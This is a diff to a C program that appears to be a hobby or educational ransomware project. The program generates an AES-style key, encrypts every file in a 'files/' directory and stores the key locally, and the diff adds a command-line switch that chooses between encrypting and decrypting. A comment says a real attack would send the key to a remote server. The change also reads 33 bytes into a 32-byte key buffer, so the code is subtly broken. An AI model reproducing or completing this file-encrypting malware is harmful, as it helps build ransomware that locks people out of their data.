@@ -115,7 +115,7 @@ void decrypt(unsigned char *key, char *fileName) {
     rename(fileTemp, fileName); // Rename our temp to override the current file even if it wasn't deleted
 }
 
-int main () {
+int main (int argc, char *argv[]) {
     // Our cipher parameters
     int num_bytes = 32; // 256-bit key size
     unsigned char *key = malloc(num_bytes);
@@ -130,10 +130,16 @@ int main () {
 
     // Write the key to a file -- in an actual attack, this would be sent to a super secret server
     // I might add the functionality for this key to be sent to a server later on
-    f_key = fopen("key.txt", "wb");
-    fwrite(key, 1, 32, f_key);
-    fclose(f_key);
-
+    if (argc <= 1) {
+        f_key = fopen("key.txt", "wb");
+        fwrite(key, 1, 32, f_key);
+        fclose(f_key);
+    } else {
+        f_key = fopen("key.txt", "rb");   
+        fread(key, 32 + 1, 1, f_key);
+        fclose(f_key);
+    }
+    
     char directory[] = "files/";
     char *pathLocation = malloc(strlen(directory) + strlen(fileName) + 1);
     users = opendir(directory);
@@ -146,8 +152,11 @@ int main () {
             continue;
         } 
         // Call the encryption function to encrypt the files
-        encrypt(key, pathLocation);
-        decrypt(key, pathLocation);
+        if (argc <= 1) {
+            encrypt(key, pathLocation);
+        } else {
+            decrypt(key, pathLocation);
+        }
     }
     closedir(users);    
     // We don't like our keys being stored in the memory
